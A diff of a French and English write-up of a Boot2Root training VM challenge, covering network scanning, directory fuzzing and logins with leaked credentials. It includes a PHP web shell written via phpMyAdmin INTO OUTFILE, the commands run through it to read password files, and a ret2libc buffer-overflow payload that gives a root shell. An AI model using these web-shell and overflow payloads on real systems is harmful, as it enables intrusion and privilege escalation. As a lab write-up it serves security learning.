@@ -1,409 +1,440 @@
-## I - Find the port
+# Boot2Root
+
+Challenge Securité : Cherchez en groupe les différents moyens de passer root sur l'ISO fournie en ressources.
+
+## Débuter avec la VM
+
+On lance la VM
+
+On n'a pas d'informations, on cherche alors à trouver l'adresse IP de la VM
+
+On remarque que dans les configs de la VM, on a l'adresse MAC (Réseau->avancé)
+
+```bash
+arp-scan -l
+```
+
+va afficher : (pour Marie : sudo arp-scan --interface=en0 --localnet)
+
+            Interface: en0, type: EN10MB, MAC: f0:18:98:5c:ac:dd, IPv4: 192.168.0.19
+            Starting arp-scan 1.9.7 with 256 hosts (https://github.com/royhills/arp-scan)
+            192.168.0.30	08:00:27:16:fc:a0	PCS Systemtechnik GmbH    //*********************Correspond à l'adresse MAC
+            192.168.0.18	98:09:cf:93:62:fc	OnePlus Technology (Shenzhen) Co., Ltd
+            192.168.0.254	00:24:d4:a4:ee:30	FREEBOX SAS
+
+            530 packets received by filter, 0 packets dropped by kernel
+            Ending arp-scan 1.9.7: 256 hosts scanned in 1.870 seconds (136.90 hosts/sec). 3 responded
+
+On regarde ensuite quels ports sont ouverts avec :
+
+```bash
+nmap -v -A [IP]
+```
+
+On voit que les ports suivants sont présents :
+
+```bash
+22/tcp  open  ssh        OpenSSH 5.9p1 Debian 5ubuntu1.7 (Ubuntu Linux; protocol 2.0)
+80/tcp  open  http       Apache httpd 2.2.22 ((Ubuntu))
+```
+
+on essaye donc de rentrer l'ip dans le navigateur et on obtient le site
+
+Mais on ne peut rien faire dessus
+
+## Le site / Dirb
+
+On part donc dans de grandes recherches, parmi celles-ci, on cherche à trouver les fichiers cachés du site.
+
+Je trouve dirsearch : mais après moults essais, on n'arrive pas à le faire fonctionner, on se tourne donc vers un site proposant des équivalents :
+https://blog.sec-it.fr/en/2021/02/16/fuzz-dir-tools/
+
+Le premier proposé est dirb
+
+Effectivement après installation avec :
+
+```bash
+            cd ~/Applications
+            wget https://downloads.sourceforge.net/project/dirb/dirb/2.22/dirb222.tar.gz
+            tar -xvf dirb222.tar.gz
+            rm dirb222.tar.gz
+            brew install autoconf
+            chmod -R 755 dirb222
+            cd dirb222
+            ./configure
+            make
+            make install
+```
+
+On peut lancer dirb comme suit :
+
+```bash
+dirb http://192.168.0.30/ wordlists/common.txt
+```
+
+On obtient alors :
+
+```bash
+            GENERATED WORDS: 4612
+
+            ---- Scanning URL: http://192.168.0.30/ ----
+            + http://192.168.0.30/cgi-bin/ (CODE:403|SIZE:288)
+            ==> DIRECTORY: http://192.168.0.30/fonts/
+            + http://192.168.0.30/forum (CODE:403|SIZE:285)
+            + http://192.168.0.30/index.html (CODE:200|SIZE:1025)
+            + http://192.168.0.30/server-status (CODE:403|SIZE:293)
+
+            ---- Entering directory: http://192.168.0.30/fonts/ ----
+            (!) WARNING: Directory IS LISTABLE. No need to scan it.
+                (Use mode '-w' if you want to scan it anyway)
+```
+
+Dirb a scanné le site et a trouvé des répertoires cachés, le seul auquel nous avons accès actuellement est http://192.168.0.30/forum
+/!\ il faut passer le site en httpS !
+
+## Le Forum
+
+Quand on se connecte sur le forum, on peut voir différents sujets inutiles, et un très intéressant :
+Probleme login ?
+
+Quand on l'ouvre on se rend compte que ce sont des retours de commandes, parmi ceux-ci se trouve :
+
+```bash
+            Failed password for invalid user !q\]Ej?*5K5cy*AJ from 161.202.39.38 port 57764 ssh2
+            Oct 5 08:45:29 BornToSecHackMe sshd[7547]: Received disconnect from 161.202.39.38: 3: com.jcraft.jsch.JSchException: Auth fail [preauth]
+            Oct 5 08:46:01 BornToSecHackMe CRON[7549]: pam_unix(cron:session): session opened for user lmezard by (uid=1040)
+```
+
+on essaye donc de se connecter sur la VM mais ça ne marche pas, on essaye donc de se connecter simplement au forum :
 
 ````bash
-$>ifconfig
-…
-en0: flags=8863<UP,BROADCAST,SMART,RUNNING,SIMPLEX,MULTICAST> mtu 1500
-	options=400<CHANNEL_IO>
-	ether 14:7d:da:39:fa:4c
-	inet6 fe80::89e:d84e:b458:2477%en0 prefixlen 64 secured scopeid 0x6
-	inet 192.168.1.85 netmask 0xffffff00 broadcast 192.168.1.255
-	nd6 options=201<PERFORMNUD,DAD>
-	media: autoselect
-	status: active
-….
+            Id = lmezard
+            mdp = !q\]Ej?*5K5cy*AJ    (la personne s'est sûrement trompée et a rentré son mot de passe en login)
 
-
-$>nmap 192.168.1.0-255
-Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-18 15:54 CEST
-Nmap scan report for box (192.168.1.1)
-Host is up (0.0023s latency).
-Not shown: 996 filtered ports
-PORT      STATE SERVICE
-53/tcp    open  domain
-80/tcp    open  http
-1287/tcp  open  routematch
-49152/tcp open  unknown
-
-Nmap scan report for BornToSecHackMe (192.168.1.58)
-Host is up (0.00059s latency).
-Not shown: 994 closed ports
-PORT    STATE SERVICE
-21/tcp  open  ftp
-22/tcp  open  ssh
-80/tcp  open  http
-143/tcp open  imap
-443/tcp open  https
-993/tcp open  imaps
-
-Nmap scan report for Relkondos-MBP (192.168.1.85)
-Host is up (0.000088s latency).
-Not shown: 999 closed ports
-PORT     STATE SERVICE
-6881/tcp open  bittorrent-tracker
-
-Nmap done: 256 IP addresses (3 hosts up) scanned in 65.27 seconds
+Ca marche ! On arrive alors sur sa page profil et on obtient son adresse email =
+```bash
+laurie@borntosec.net
 ````
 
+On ne sait pas trop quoi faire de plus, on voit bien un espace Users et contact mais rien de croustillant
 
-=> The port is 192.168.1.58
+## Webmail
 
+Etant donné que nous avons dû passer le site en https, on rééssaye la commande dirb avec le https
 
+```bash
+dirb https://192.168.0.30/ wordlists/common.txt
 
-## II. Exploring with dirb
+            GENERATED WORDS: 4612
 
-Intalling dirb => 
-````bash
-$>cd ~/Applications
-wget https://downloads.sourceforge.net/project/dirb/dirb/2.22/dirb222.tar.gz
-tar -xvf dirb222.tar.gz
-rm dirb222.tar.gz
-brew install autoconf
-chmod -R 755 dirb222
-cd dirb222
-./configure
-make
-make install
-````
+            ---- Scanning URL: https://192.168.0.30/ ----
+            + https://192.168.0.30/cgi-bin/ (CODE:403|SIZE:289)
+            ==> DIRECTORY: https://192.168.0.30/forum/
+            ==> DIRECTORY: https://192.168.0.30/phpmyadmin/                 //NOUVELLE PAGE
+            + https://192.168.0.30/server-status (CODE:403|SIZE:294)
+            ==> DIRECTORY: https://192.168.0.30/webmail/                   //NOUVELLE PAGE
 
-Then =>
+            ---- Entering directory: https://192.168.0.30/forum/ ----
+            + https://192.168.0.30/forum/backup (CODE:403|SIZE:293)
+            + https://192.168.0.30/forum/config (CODE:403|SIZE:293)
+            ==> DIRECTORY: https://192.168.0.30/forum/images/
+            ==> DIRECTORY: https://192.168.0.30/forum/includes/
+            + https://192.168.0.30/forum/index (CODE:200|SIZE:4935)
+            + https://192.168.0.30/forum/index.php (CODE:200|SIZE:4935)
+            ==> DIRECTORY: https://192.168.0.30/forum/js/
+            ==> DIRECTORY: https://192.168.0.30/forum/lang/
+            ==> DIRECTORY: https://192.168.0.30/forum/modules/
+            ==> DIRECTORY: https://192.168.0.30/forum/templates_c/
+            ==> DIRECTORY: https://192.168.0.30/forum/themes/
+            ==> DIRECTORY: https://192.168.0.30/forum/update/
+```
 
-````
-$>dirb https://192.168.1.58 ~/Applications/dirb222/wordlists/common.txt
+On essaye d'aller sur https://192.168.0.30/webmail/
 
------------------
-DIRB v2.22
-By The Dark Raver
+On obtient une page login, on peut se connecter avec les identifiants de Laurie :
 
------------------
+```bash
+Id : laurie@borntosec.net
+Mot de passe : !q\]Ej?*5K5cy*AJ
+```
 
-START_TIME: Tue May 18 17:44:47 2021
-URL_BASE: https://192.168.1.58/
-WORDLIST_FILES: /Users/relkondo/Applications/dirb222/wordlists/common.txt
+On tombe sur sa boite mail avec deux mails :
+L'un d'entre eux est : DB Access et contient :
 
------------------
+```bash
+            Hey Laurie,
 
-GENERATED WORDS: 4612
+            You cant connect to the databases now. Use root/Fg-'kKXBj87E:aJ$
 
----- Scanning URL: https://192.168.1.58/ ----
-+ https://192.168.1.58/cgi-bin/ (CODE:403|SIZE:289)
-==> DIRECTORY: https://192.168.1.58/forum/
-==> DIRECTORY: https://192.168.1.58/phpmyadmin/
-+ https://192.168.1.58/server-status (CODE:403|SIZE:294)
-==> DIRECTORY: https://192.168.1.58/webmail/
+            Best regards.
+```
 
-[…]
-````
+## PhpMyAdmin
 
+Maybe sur la page https://192.168.0.30/phpmyadmin/ ?
 
+Les identifiants ont marché, on voit qu'il y a une base de données : forum_db
 
-## III. Successive intrusions
+En se connectant sur phpmyadmin en tant que root, on peut utiliser la fenetre de commandes sql.
+Quand on regarde la structure de mylittleforum, il y a un dossier templates_c. Quand on navigue dessus, on voit plusieurs fichiers php sur lesquels on peut naviguer.
+Si on arrive a creer une page php ici on pourra lui faire executer des commandes.
+Dans la fenetre de commandes SQL on lance :
 
-Going into https://192.168.1.58/forum/, we find 
-````
-Oct 5 08:45:29 BornToSecHackMe sshd[7547]: Failed password for invalid user !q\]Ej?*5K5cy*AJ from 161.202.39.38 port 57764 ssh2
-````
-in
-“Probleme login ? by lmezard” page.
+```bash
+SELECT "<?php system($GET_['exploit']) ?>" INTO OUTFILE "/var/www/forum/templates_c/exploit.php"
+```
 
-We connect with it to the forum. Going into mlezard profile (https://192.168.1.58/forum/index.php?mode=user&action=edit_profile), we find his email to be laurie@borntosec.net.
+Cela cree le ficher exploit.php sur lequel on peut naviguer et auquel on peut passer des commandes dans l'URL
 
-=> connect to https://192.168.1.58/webmail/
+En fouillant dans le serveur, on fini par tomber sur :
 
-````
-Hey Laurie,
-
-You cant connect to the databases now. Use root/Fg-'kKXBj87E:aJ$
-
-Best regards.
-````
-
-=> connect to phpmyadmin
-
-
-
-## IV. Injection
-
-In phpmyadmin :
-
-````
-SELECT "<?php system($_GET['cmd’].’ 2>&1’) ?>" INTO OUTFILE "/var/www/forum/templates_c/exploit.php"
-````
-
-````bash
-$> curl -k 'https://192.168.1.58/forum/templates_c/exploit.php?cmd=pwd'
-/var/www/forum/templates_c
-
-=> -k = —insecure
-=> injection was successful
-
-curl -k 'https://192.168.1.58/forum/templates_c/exploit.php?cmd=ls%20/home’
+```bash
+https://192.168.56.3/forum/templates_c/exploit.php?exploit=ls%20/home
 LOOKATME ft_root laurie laurie@borntosec.net lmezard thor zaz
-
-curl -k 'https://192.168.1.58/forum/templates_c/exploit.php?cmd=ls%20/home/LOOKATME’
+https://192.168.56.3/forum/templates_c/exploit.php?exploit=ls%20/home/LOOKATME
 password
-
-curl -k 'https://192.168.1.58/forum/templates_c/exploit.php?cmd=cat%20/home/LOOKATME/password’
+https://192.168.56.3/forum/templates_c/exploit.php?exploit=cat%20/home/LOOKATME/password
 lmezard:G!@M6f4Eatau{sF"
-````
+```
 
+Avec cet identifiant et ce mot de passe, on peut se connecter sur la VM
+Dans le home de lmezard, il y a un fichier `fun` et un ficher `README` qui nous challenge a trouver la solution du probleme.
 
+Le fichier fun comporte des strings, des noms de fichiers, etc. La string ustar revient souvent, et on en deduit que le fichier est un fichier tar.
 
-## V. Get files through FTP
+```bash
+`tar -C /tmp -xvf fun`
+```
 
-It’s not an ssh password. We look for open services  with nmap with version detection:
+Et on obtient plein de fichiers. Certains comportent des strings interessantes : "getme()". On trouve :
 
-````bash
-$> nmap 192.168.1.58
+```bash
+            grep -A2 getme /tmp/ft_fun/*
+```
 
-Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-19 22:37 CEST
-Nmap scan report for BornToSecHackMe (192.168.1.58)
-Host is up (0.00018s latency).
-Not shown: 994 closed ports
-PORT    STATE SERVICE
-21/tcp  open  ftp
-22/tcp  open  ssh
-80/tcp  open  http
-143/tcp open  imap
-443/tcp open  https
-993/tcp open  imaps
+les fonctions getme retournent un caractere qui est ensuite print et pour lequel on nous dit d'utiliser SHA-256
+Certaines fonctions sont sur plusieurs fichiers, et dans ce cas il faut se ficher au numero de fichier inclu dans le contenu du fichier et regarder le ficher suivant.
 
-$> brew install inetutils
+On peut aussi "concatenate" les lignes de code en un fichier .c en utilisant un script python (voir read_fun.py) et l'executer :
 
-$> ftp lmezard@192.168.1.58
-Connected to 192.168.1.58.
-220 Welcome on this server
-331 Please specify the password.
-Password:
-230 Login successful.
-ftp> ls
-200 PORT command successful. Consider using PASV.
-150 Here comes the directory listing.
--rwxr-x---    1 1001     1001           96 Oct 15  2015 README
--rwxr-x---    1 1001     1001       808960 Oct 08  2015 fun
-226 Directory send OK.
-ftp> get README
-200 PORT command successful. Consider using PASV.
-150 Opening BINARY mode data connection for README (96 bytes).
-WARNING! 1 bare linefeeds received in ASCII mode
-File may not have transferred correctly.
-226 Transfer complete.
-96 bytes received in 0.000154 seconds (609 kbytes/s)
-ftp> get fun
-200 PORT command successful. Consider using PASV.
-150 Opening BINARY mode data connection for fun (808960 bytes).
-WARNING! 2764 bare linefeeds received in ASCII mode
-File may not have transferred correctly.
-226 Transfer complete.
-808960 bytes received in 0.0765 seconds (10.1 Mbytes/s)
-ftp> !ls
-README	fun
-ftp> bye
-221 Goodbye.
-
-$> file fun
-fun: POSIX tar archive (GNU)
-
-$> mv fun fun.tar
-$> tar -xf fun.tar
-````
-
-=> We find the content to be lines of code with a file number. We concatenate into a .c file using a python script (see read_fun.py), compile and execute it :
-````
+```bash
 MY PASSWORD IS: Iheartpwnage
 Now SHA-256 it and submit%
 ````
 
-=> SHA-256 : 330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4
+EN utlisant SHA-256, on obtient :
 
-````
-$>  ssh laurie@192.168.1.58
-````
+```bash
+Iheartpwnage => 330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4
+```
 
+ssh laurie@192.168.0.30 -p 22
+mdp : 330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4
 
+## Laurie
 
-## VI. The bomb
+il y a un fichier bomb que l'on execute :
+Après avoir testé différentes méthodes, on a retenu Ghidra :
 
-using ghidra
+On récupère le fichier avec scp -P 22 laurie@192.168.0.30:bomb .
 
-Phase_1 just checks if answer is 
+Les réponses aux 6 phases sont :
+
+### Phase 1
+
+Phase 1 :
+
+```bash
 Public speaking is very easy.
+```
 
-Phase_2 check if answer is a set of 6 numbers equal to k! for k = [1..6]
+Note : on le trouve directement en faisant un string ou dans ghidra fonction Phase_1 avec le compare
+
+### Phase 2
+
+Phase 2 :
+
+```bash
 1 2 6 24 120 720
+```
 
-Phase_3 has 6 answer possible depending of the first number
-0 q 777 OR 1 b 214 OR 2 b 755…
-Based on hint : 1 b 214
+Note : on a fait le calcul u[i] = i x u[i - 1] avec u[0] = 1
 
-Phase_4 is expecting the Fibonacci number (minus one) that gives 55
+### Phase 3
+
+Phase 3 :
+
+```bash
+1 b 214
+```
+
+On sait que le milieu = b (indice) donc on essaye de trouver le premier chiffre qui correspondrait et on en deduit le dernier (ex avec les cases)
+
+### Phase 4
+
+Phase 4 :
+
+```bash
 9
+```
 
-Phase_5 is requiring us to input a string where the ASCII code (modulo 16) of each character are used to find the spot in “isrveawhobpnutfg” in order to write “giants”
-“giants” in “isrveawhobpnutfg” =  characters number 15, 0, 5, 11, 13, 1, so :
-?05;=1 OR O@EKMA OR opukmq OR opekmq
-Based on hint : opekmq
+Il fallait que ce soit égale à 55 donc on a fait un petit programme qui nous ressortira la valeur qui correspond (cf Phase_4_bomb.c)
 
-Phase_6 expect 6 different numbers. It’s ordering a chain of nodes based on our inpt, then check if the vales of the nodes are decreasing. We should input the order by decreasing values.
+### Phase 5
 
-(gdb) p node1
-$1 = 253
-(gdb) p node2
-$2 = 725
-(gdb) p node3
-$3 = 301
-(gdb) p node4
-$4 = 997
-(gdb) p node5
-$5 = 212
-(gdb) p node6
-$6 = 432
+Phase 5 :
 
-=> 4 2 6 3 1 5
+```bash
+opekmq
+```
 
-Final password :
+En examinant la fonction on voit qu'il y a une recursive appliquée à la string entrée et qui la modifie
+On cherche la string qui apres modification sera égale à giants
+Le programme fait l'équivalence entre toutes les lettres
+(cf Phase_5_bomb.c)
+
+### Phase 6
+
+Phase 6 :
+
+```bash
+4 2 6 3 1 5
+```
+
+On comprend qu'il doit y avoir 6 nombres et que ces 6 nombres sont compris entre 1 et 6 et sont uniques. L'indice nous indique que le premier nombre est 4.
+
+En cherchant la valeur de node1 on se rend compte qu'il y a aussi node2, node3 etc.. et qu'ils sont comme chainés.
+on prend alors la valeur de node1 qui est en hexa et on la convertie en decimal
+https://decimal-to-binary.com/decimal-to-binary-converter-online.html
+
+On obtient pour chaque :
+
+```bash
+node : hexa : decimal
+1 : 000000fd : 253
+2 : 000002d5 : 725
+3 : 0000012d : 301
+4 : 000003e5 : 997
+5 : 000000d4 : 212
+6 : 000001b0 : 432
+```
+
+On voit alors que n+1 doit etre inferieur à n donc ça donne 4 2 6 3 1 5 (DESC)
+
+### Defused ?
+
+La bomb est defused mais quand on tape le mdp pour Thor ça ne fonctionne pas :
+
+```bash
+Publicspeakingisveryeasy.126241207201b2149opekmq426315
+```
+
+Sur le slack, il est dit qu'il faut inverser 2 caracteres, donc en bruteforcant un peu on obtient le vrai mot de passe :
+
+```bash
 Publicspeakingisveryeasy.126241207201b2149opekmq426135
-Note : there’s a mistake in it, it ends with 135 instead of 315.
+```
 
+on peut donc se connecter
 
+```bash
+ssh thor@192.168.0.30 -p 22
+Publicspeakingisveryeasy.126241207201b2149opekmq426135
+```
 
-## VII. Thor
-Instructions are based on the python turtle game, used to teach coding to children.
-````bash
-($ virtualenv v_turtle)
-$ source v_turtle/bin/activate
-($ pip install turtle)
-($ sudo apt-get install python-tk)
-$ python3 scripts/solve_turtle.py
-````
+## Thor
 
-=> SLASH
-Can you digest the message ? => this means we got to md5 the password 
-=> 646da671ca01bb5d84dbb5fb2238dc8e
+Une fois connecté, le README demande juste de résoudre l'exo et de s'en servir comme mdp pour zaz
+Quand on cat on obtient un long texte avec à la fin "Can you digest the message? :)"
 
+On comprends que c'est un algo de dessin et en tapant des bouts de code sur Google on trouve le "turtle" qui est, comme par hasard, le nom du fichier.
 
+Samy nous a donc fait un super algo pour nous l'afficher ! (cf turtle_Samy.py)
 
-## VIII. Zaz
+On obtient SLASH
 
-Check if ASLR protection (address space layout randomization, a protection that triggers use of random memory address for each binary execution) is deactivated :
-````bash
-cat /proc/sys/kernel/randomize_va_space
-0
-````
+Le mot de passe ne passe pas pour zaz, on cherche donc digest message sur Google et on tombe sur... MD5 !
 
-Also, there’s no checksec, but otherwise would be good to do a checksec --file=exploit_me 
-````bash
-gdb-peda$ disas main
-Dump of assembler code for function main:
-   0x080483f4 <+0>:	    push   ebp
-   0x080483f5 <+1>:	    mov    ebp,esp
-   0x080483f7 <+3>:	    and    esp,0xfffffff0
-   0x080483fa <+6>:	    sub    esp,0x90
-   0x08048400 <+12>:	cmp    DWORD PTR [ebp+0x8],0x1
-   0x08048404 <+16>:	jg     0x804840d <main+25>
-   0x08048406 <+18>:	mov    eax,0x1
-   0x0804840b <+23>:	jmp    0x8048436 <main+66>
-   0x0804840d <+25>:	mov    eax,DWORD PTR [ebp+0xc]
-   0x08048410 <+28>:	add    eax,0x4
-   0x08048413 <+31>:	mov    eax,DWORD PTR [eax]
-   0x08048415 <+33>:	mov    DWORD PTR [esp+0x4],eax
-   0x08048419 <+37>:	lea    eax,[esp+0x10]
-   0x0804841d <+41>:	mov    DWORD PTR [esp],eax
-   0x08048420 <+44>:	call   0x8048300 <strcpy@plt>
-   0x08048425 <+49>:	lea    eax,[esp+0x10]
-   0x08048429 <+53>:	mov    DWORD PTR [esp],eax
-   0x0804842c <+56>:	call   0x8048310 <puts@plt>
-   0x08048431 <+61>:	mov    eax,0x0
-   0x08048436 <+66>:	leave  
-   0x08048437 <+67>:	ret    
-End of assembler dump.
-````
+On fait donc le md5 de SLASH et on obtient : 646da671ca01bb5d84dbb5fb2238dc8e
 
-There’ s a strcpy. Maybe we can overflow and do a return-to-libc attack ?
+## Zaz
 
-````bash
-./exploit_me $(perl -e 'print “DEVIL”x666')
-````
+On se connecte :
 
-Works, segfault. We can’t install peda and do a pattern search, so we find the 140 char limit through trial and error.
-We find the address of system, exit, /bin/sh : 
+```bash
+ssh zaz@192.168.0.30 -p 22
+646da671ca01bb5d84dbb5fb2238dc8e
+```
 
-````bash
-zaz@BornToSecHackMe:~$ gdb exploit_me
-GNU gdb (Ubuntu/Linaro 7.4-2012.04-0ubuntu2.1) 7.4-2012.04
-Copyright (C) 2012 Free Software Foundation, Inc.
-License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
-This is free software: you are free to change and redistribute it.
-There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
-and "show warranty" for details.
-This GDB was configured as "i686-linux-gnu".
-For bug reporting instructions, please see:
-<http://bugs.launchpad.net/gdb-linaro/>...
-Reading symbols from /home/zaz/exploit_me...(no debugging symbols found)...done.
+On suit le tutoriel de :
+https://beta.hackndo.com/retour-a-la-libc/
 
-$(gdb) b *main
-Breakpoint 1 at 0x80483f4
+```bash
+            (gdb) r $(perl -e 'print "A"x140 . "\xef\xbe\xad\xde"')
+                Starting program: /home/zaz/exploit_me $(perl -e 'print "A"x200 . "\xef\xbe\xad\xde"')
+                perl: warning: Setting locale failed.
+                perl: warning: Please check that your locale settings:
+                    LANGUAGE = (unset),
+                    LC_ALL = (unset),
+                    LC_TERMINAL_VERSION = "3.3.12",
+                    LC_CTYPE = "fr_FR.UTF-8",
+                    LC_TERMINAL = "iTerm2",
+                    LANG = "en_US.UTF-8"
+                    are supported and installed on your system.
+                perl: warning: Falling back to the standard locale ("C").
+                AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAﾭ�
 
-$(gdb) r WHATEVER
+                Program received signal SIGSEGV, Segmentation fault.
+                0x41414141 in ?? ()
+            (gdb) p system
+                $1 = {<text variable, no debug info>} 0xb7e6b060 <system>
 
-$(gdb) info function system
-All functions matching regular expression "system":
+            (gdb) find __libc_start_main,+99999999,"/bin/sh"
+                0xb7f8cc58
+                warning: Unable to access target memory at 0xb7fd3160, halting search.
+                1 pattern found.
 
-Non-debugging symbols:
-0xb7e6b060  __libc_system
-0xb7e6b060  system
-0xb7f49550  svcerr_systemerr
+            (gdb) r "$(perl -e 'print "A"x140 . "\x60\xb0\xe6\xb7" . "OSEF" . "\x58\xcc\xf8\xb7"')"
+                The program being debugged has been started already.
+                Start it from the beginning? (y or n) y
 
+                Starting program: /home/zaz/exploit_me "$(perl -e 'print "A"x140 . "\x60\xb0\xe6\xb7" . "OSEF" . "\x58\xcc\xf8\xb7"')"
+                perl: warning: Setting locale failed.
+                perl: warning: Please check that your locale settings:
+                    LANGUAGE = (unset),
+                    LC_ALL = (unset),
+                    LC_TERMINAL_VERSION = "3.3.12",
+                    LC_CTYPE = "fr_FR.UTF-8",
+                    LC_TERMINAL = "iTerm2",
+                    LANG = "en_US.UTF-8"
+                    are supported and installed on your system.
+                perl: warning: Falling back to the standard locale ("C").
+                AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA`��OSEFX��
+            $(perl -e 'print "A"x140 . "\x60\xb0\xe6\xb7" . "OSEF" . "\x58\xcc\xf8\xb7"')) perl: warning: Setting locale failed.
+                perl: warning: Please check that your locale settings:
+                    LANGUAGE = (unset),
+                    LC_ALL = (unset),
+                    LC_CTYPE = "fr_FR.UTF-8",
+                    LC_TERMINAL_VERSION = "3.3.12",
+                    LC_TERMINAL = "iTerm2",
+                    LANG = "en_US.UTF-8"
+                    are supported and installed on your system.
+                perl: warning: Falling back to the standard locale ("C").
+                /bin/sh: 1: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA`��OSEFX��: not found
+            $ ./exploit_me $(perl -e 'print "A"x140 . "\x60\xb0\xe6\xb7" . "OSEF" . "\x58\xcc\xf8\xb7"')
+                perl: warning: Setting locale failed.
+                perl: warning: Please check that your locale settings:
+                    LANGUAGE = (unset),
+                    LC_ALL = (unset),
+                    LC_CTYPE = "fr_FR.UTF-8",
+                    LC_TERMINAL_VERSION = "3.3.12",
+                    LC_TERMINAL = "iTerm2",
+                    LANG = "en_US.UTF-8"
+                    are supported and installed on your system.
+                perl: warning: Falling back to the standard locale ("C").
+                AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA`��OSEFX��
+            # whoami
+                root
+```
 
-$(gdb) info function exit
-All functions matching regular expression "exit":
-
-Non-debugging symbols:
-0xb7e5ebe0  exit
-0xb7e5ec10  on_exit
-0xb7e5ee20  __cxa_atexit
-0xb7e5efc0  quick_exit
-0xb7e5eff0  __cxa_at_quick_exit
-0xb7ee41d8  _exit
-0xb7f28500  pthread_exit
-0xb7f2dc10  __cyg_profile_func_exit
-0xb7f4c750  svc_exit
-0xb7f56c80  atexit
-
-$(gdb) info proc map
-process 7577
-Mapped address spaces:
-
-	Start Addr   End Addr       Size     Offset objfile
-	 0x8048000  0x8049000     0x1000        0x0 /home/zaz/exploit_me
-	 0x8049000  0x804a000     0x1000        0x0 /home/zaz/exploit_me
-	0xb7e2b000 0xb7e2c000     0x1000        0x0
-	0xb7e2c000 0xb7fcf000   0x1a3000        0x0 /lib/i386-linux-gnu/libc-2.15.so
-	0xb7fcf000 0xb7fd1000     0x2000   0x1a3000 /lib/i386-linux-gnu/libc-2.15.so
-	0xb7fd1000 0xb7fd2000     0x1000   0x1a5000 /lib/i386-linux-gnu/libc-2.15.so
-	0xb7fd2000 0xb7fd5000     0x3000        0x0
-	0xb7fdb000 0xb7fdd000     0x2000        0x0
-	0xb7fdd000 0xb7fde000     0x1000        0x0 [vdso]
-	0xb7fde000 0xb7ffe000    0x20000        0x0 /lib/i386-linux-gnu/ld-2.15.so
-	0xb7ffe000 0xb7fff000     0x1000    0x1f000 /lib/i386-linux-gnu/ld-2.15.so
-	0xb7fff000 0xb8000000     0x1000    0x20000 /lib/i386-linux-gnu/ld-2.15.so
-	0xbffdf000 0xc0000000    0x21000        0x0 [stack]
-$(gdb) find 0xb7e2c000,0xb7fcf000,"/bin/sh"
-0xb7f8cc58
-1 pattern found.
-````
-
-=> 0xb7e6b060  system, 0xb7e5ebe0  exit, 0xb7f8cc58 /bin/sh
-
-We overwrite the EIP register with the address of system
-Next is the address where system should return at the end. We’ll put the address of exit. It should be noted that the exit() function is not very necessary for this attack; however, without this function, when system() returns, the program might crash, causing suspicions.
-We push on the stack at [EIP + 8] the address of /bin/sh. 
-
-````bash
-$./exploit_me $(perl -e 'print "Z"x140, "\x60\xb0\xe6\xb7", "\xe0\xeb\xe5\xb7", "\x58\xcc\xf8\xb7"')
-ZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZ`�����X��
-$ whoami
-root
-````
-
-Trivia : ret2libc attack was first performed by Александр Песляк in 1997, the author of John the Ripper.
+## We did it !
